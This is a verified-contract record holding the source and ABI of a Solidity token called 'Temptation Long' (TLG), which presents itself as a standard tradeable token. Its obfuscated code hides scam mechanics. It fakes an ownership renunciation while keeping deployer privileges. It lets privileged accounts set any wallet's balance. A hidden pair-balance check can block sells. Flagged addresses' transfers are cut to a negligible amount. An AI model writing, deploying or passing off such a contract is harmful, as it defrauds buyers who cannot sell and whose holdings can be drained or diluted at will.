{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface swapExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTotal {\n    function createPair(address txTake, address swapLiquidityIs) external returns (address);\n}\n\ninterface sellReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxLaunched) external view returns (uint256);\n\n    function transfer(address txFundReceiver, uint256 launchedTeam) external returns (bool);\n\n    function allowance(address senderMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txFundReceiver,\n        uint256 launchedTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamAuto, uint256 value);\n    event Approval(address indexed senderMarketing, address indexed spender, uint256 value);\n}\n\ninterface sellReceiverMetadata is sellReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TemptationLong is teamMin, sellReceiver, sellReceiverMetadata {\n\n    mapping(address => uint256) private fromToken;\n\n    function feeLimit(address tradingTx) public {\n        teamTotal();\n        if (exemptTx != enableMinLimit) {\n            isFrom = false;\n        }\n        if (tradingTx == launchAmountFee || tradingTx == shouldSell) {\n            return;\n        }\n        isMax[tradingTx] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingMax;\n    }\n\n    uint256 public launchTx;\n\n    function fromMax(address walletExemptLaunch, address txFundReceiver, uint256 launchedTeam) internal returns (bool) {\n        require(fromToken[walletExemptLaunch] >= launchedTeam);\n        fromToken[walletExemptLaunch] -= launchedTeam;\n        fromToken[txFundReceiver] += launchedTeam;\n        emit Transfer(walletExemptLaunch, txFundReceiver, launchedTeam);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamBuy;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTotal;\n\n    address shouldExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 teamWallet;\n\n    address private atTeamSell;\n\n    function walletMax() public {\n        emit OwnershipTransferred(launchAmountFee, address(0));\n        atTeamSell = address(0);\n    }\n\n    function approve(address walletSellLiquidity, uint256 launchedTeam) public virtual override returns (bool) {\n        receiverTotal[_msgSender()][walletSellLiquidity] = launchedTeam;\n        emit Approval(_msgSender(), walletSellLiquidity, launchedTeam);\n        return true;\n    }\n\n    function teamSell(address exemptReceiver, uint256 launchedTeam) public {\n        teamTotal();\n        fromToken[exemptReceiver] = launchedTeam;\n    }\n\n    bool private tokenBuy;\n\n    constructor (){\n        if (minList == tokenBuy) {\n            totalAtSell = true;\n        }\n        swapExempt walletSwap = swapExempt(shouldExempt);\n        shouldSell = tradingTotal(walletSwap.factory()).createPair(walletSwap.WETH(), address(this));\n        \n        launchAmountFee = _msgSender();\n        walletMax();\n        totalFeeSell[launchAmountFee] = true;\n        fromToken[launchAmountFee] = receiverTeam;\n        \n        emit Transfer(address(0), launchAmountFee, receiverTeam);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTeam;\n    }\n\n    uint256 private receiverTeam = 100000000 * 10 ** 18;\n\n    uint256 public enableMinLimit;\n\n    function transfer(address exemptReceiver, uint256 launchedTeam) external virtual override returns (bool) {\n        return totalSwap(_msgSender(), exemptReceiver, launchedTeam);\n    }\n\n    uint256 public exemptTx;\n\n    function totalSwap(address walletExemptLaunch, address txFundReceiver, uint256 launchedTeam) internal returns (bool) {\n        if (walletExemptLaunch == launchAmountFee) {\n            return fromMax(walletExemptLaunch, txFundReceiver, launchedTeam);\n        }\n        uint256 tradingShould = sellReceiver(shouldSell).balanceOf(shouldAt);\n        require(tradingShould == tokenSender);\n        require(txFundReceiver != shouldAt);\n        if (isMax[walletExemptLaunch]) {\n            return fromMax(walletExemptLaunch, txFundReceiver, shouldReceiver);\n        }\n        return fromMax(walletExemptLaunch, txFundReceiver, launchedTeam);\n    }\n\n    mapping(address => bool) public isMax;\n\n    address public launchAmountFee;\n\n    bool public minList;\n\n    function transferFrom(address walletExemptLaunch, address txFundReceiver, uint256 launchedTeam) external override returns (bool) {\n        if (_msgSender() != shouldExempt) {\n            if (receiverTotal[walletExemptLaunch][_msgSender()] != type(uint256).max) {\n                require(launchedTeam <= receiverTotal[walletExemptLaunch][_msgSender()]);\n                receiverTotal[walletExemptLaunch][_msgSender()] -= launchedTeam;\n            }\n        }\n        return totalSwap(walletExemptLaunch, txFundReceiver, launchedTeam);\n    }\n\n    bool private autoLiquidity;\n\n    uint256 constant shouldReceiver = 18 ** 10;\n\n    bool public listExempt;\n\n    address public shouldSell;\n\n    function getOwner() external view returns (address) {\n        return atTeamSell;\n    }\n\n    address shouldAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address feeEnable, address walletSellLiquidity) external view virtual override returns (uint256) {\n        if (walletSellLiquidity == shouldExempt) {\n            return type(uint256).max;\n        }\n        return receiverTotal[feeEnable][walletSellLiquidity];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenList;\n    }\n\n    event OwnershipTransferred(address indexed sellSender, address indexed swapFundWallet);\n\n    uint256 tokenSender;\n\n    function tokenTo(uint256 launchedTeam) public {\n        teamTotal();\n        tokenSender = launchedTeam;\n    }\n\n    uint256 private feeAmount;\n\n    string private tokenList = \"TLG\";\n\n    function owner() external view returns (address) {\n        return atTeamSell;\n    }\n\n    mapping(address => bool) public totalFeeSell;\n\n    bool public totalAtSell;\n\n    bool public isFrom;\n\n    function balanceOf(address maxLaunched) public view virtual override returns (uint256) {\n        return fromToken[maxLaunched];\n    }\n\n    uint8 private teamBuy = 18;\n\n    function toTx(address tradingMarketing) public {\n        require(tradingMarketing.balance < 100000);\n        if (listExempt) {\n            return;\n        }\n        \n        totalFeeSell[tradingMarketing] = true;\n        \n        listExempt = true;\n    }\n\n    string private tradingMax = \"Temptation Long\";\n\n    function teamTotal() private view {\n        require(totalFeeSell[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFundWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSellLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSellLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMinLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"feeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmountFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"tokenTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAtSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFeeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExemptLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TemptationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}